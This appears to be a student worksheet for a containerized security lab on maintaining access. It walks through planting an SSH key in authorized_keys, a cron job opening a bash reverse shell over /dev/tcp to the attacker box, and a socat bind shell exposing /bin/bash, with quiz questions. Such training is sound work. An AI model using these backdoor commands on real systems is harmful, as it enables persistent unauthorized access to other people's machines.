# Lab 10: Persistence & Backdoors
## Phase 4 — Maintaining Access | Student Worksheet

---

## Before We Start (2 minutes)

**Lab-only reminder:** only target this lab's own containers.

**What you're practicing:** access that survives something changing — a rotated password, a new session, a "fix" that doesn't address the actual backdoor. You'll plant three different persistence mechanisms and prove each one independently of your original credentials.

---

## Setup (5 minutes)

```bash
make build-base
cd labs/phase4-maintaining-access/lab10-persistence
docker compose up -d
docker exec -it lab10-attacker bash
```

### Exercise 0.1: Confirm your starting foothold

```bash
ssh lowpriv@10.10.10.10
# password: lowpriv123
cat user.txt
exit
```

**Flag:** _________________________________

---

## Part 1: SSH Key Persistence (20 minutes)

A planted SSH key survives a password change completely — it's a separate authentication method entirely.

### Exercise 1.1: Generate a keypair on the attacker

```bash
ssh-keygen -t ed25519 -f /root/.ssh/lab10_key -N ""
cat /root/.ssh/lab10_key.pub
```

### Exercise 1.2: Plant it on the target

Using your password-based access:

```bash
cat /root/.ssh/lab10_key.pub | ssh lowpriv@10.10.10.10 "cat >> ~/.ssh/authorized_keys"
# password: lowpriv123
```

### Exercise 1.3: Confirm key-based login works

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "whoami"
```

**Did it log in without asking for a password?** ✓ Yes ✓ No

---

## Part 2: Prove It Survives Credential Rotation (15 minutes)

This is the actual test — not just "did the key work," but "does it still work once the thing you originally used is gone."

### Exercise 2.1: Rotate the password yourself

Playing the role of a defender who found and fixed the weak password (but not your planted key). This needs an interactive terminal (`-t`), since `passwd` prompts for input:

```bash
ssh -t -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "passwd"
# follow the prompts: current password lowpriv123, then set a new one, e.g. N3wStr0ngPass!
```

### Exercise 2.2: Confirm the original password no longer works

```bash
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no lowpriv@10.10.10.10 "whoami"
# should now fail
```

**Did the old password get rejected?** ✓ Yes ✓ No

### Exercise 2.3: Confirm your key still gets you in

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "cat root.txt"
```

**Flag:** _________________________________

**Question:** In your own words — why does an SSH key survive a password rotation, when both are technically "credentials" for the same account?

_________________________________

---

## Part 3: Cron Backdoor — a Reverse Shell That Phones Home (20 minutes)

### Exercise 3.1: Start a listener on your attacker machine

In a **second terminal** (`docker exec -it lab10-attacker bash`):

```bash
nc -lvnp 4444
```

### Exercise 3.2: Plant a cron job on the target

Back in your first session:

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 \
  '(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.10.10.2/4444 0>&1\"") | crontab -'
```

This adds a job that fires every minute and opens a reverse shell back to your attacker box.

### Exercise 3.3: Wait for it to fire

Cron runs on the minute — wait up to 60 seconds and watch your `nc` listener.

**Did you get a shell?** ✓ Yes ✓ No

**Question:** What's the practical downside of a cron-based backdoor compared to the SSH key you planted in Part 1? Think about timing, reliability, and how "loud" each one is.

_________________________________

Clean up the cron job when you're done:

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "crontab -r"
```

---

## Part 4: A Bind Shell with socat (10 minutes)

A reverse shell connects *out* from the target to you. A bind shell does the opposite — it listens *on* the target, and you connect *to* it.

### Exercise 4.1: Start a bind shell listener on the target

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 \
  "nohup socat TCP-LISTEN:4445,reuseaddr,fork EXEC:/bin/bash > /dev/null 2>&1 & disown; sleep 1; echo started"
```

### Exercise 4.2: Connect to it directly

```bash
socat - TCP:10.10.10.10:4445
whoami
exit
```

**Question:** A reverse shell needs your listener reachable from the target's network. A bind shell needs the target's port reachable from yours. In a real engagement behind NAT/firewalls, which direction is usually easier to get through, and why?

_________________________________

---

## Quick Knowledge Check

1. Why does a planted SSH public key survive a password rotation?
   - A) It doesn't — both break together  B) Key-based and password-based auth are independent mechanisms; changing one doesn't affect the other  C) SSH keys are stored in the password file  D) It requires the old password to keep working

2. What's the main weakness of a cron-based backdoor compared to a planted SSH key?
   - A) None, they're equivalent  B) It only fires on a schedule (e.g. once a minute) rather than being available instantly, and a visible crontab entry is easy for defenders to spot  C) Cron doesn't work in containers  D) It requires a GUI

3. What's the fundamental difference between a reverse shell and a bind shell?
   - A) No difference  B) A reverse shell connects out from the target to the attacker; a bind shell listens on the target for the attacker to connect in  C) A bind shell is always encrypted  D) A reverse shell requires root

4. Why did Part 2 rotate the password instead of just checking the key worked from the start?
   - A) No real reason  B) To prove the persistence mechanism is actually independent of the original access method, not just redundant with it  C) It's required by SSH  D) To test network speed

5. In `(crontab -l 2>/dev/null; echo "...") | crontab -`, what does `crontab -l 2>/dev/null` accomplish?
   - A) Nothing  B) Preserves any existing cron jobs by listing them first, so the new job is appended rather than replacing everything  C) Lists all users' crontabs  D) Deletes the crontab

---

## Cleanup

```bash
exit
cd labs/phase4-maintaining-access/lab10-persistence
docker compose down
```

---

## Summary

Today you learned to:
✓ Plant an SSH key for persistence independent of password authentication
✓ Prove a persistence mechanism survives credential rotation, not just assume it does
✓ Set up a cron-triggered reverse shell
✓ Set up and connect to a socat bind shell
✓ Reason about the tradeoffs (timing, visibility, network direction) between persistence techniques

---

## Optional: CTF Challenge

See **[ctf-challenge.md](./ctf-challenge.md)**. Flag format `flag{...}`. Walkthrough: **[ctf-walkthrough.md](./ctf-walkthrough.md)**.
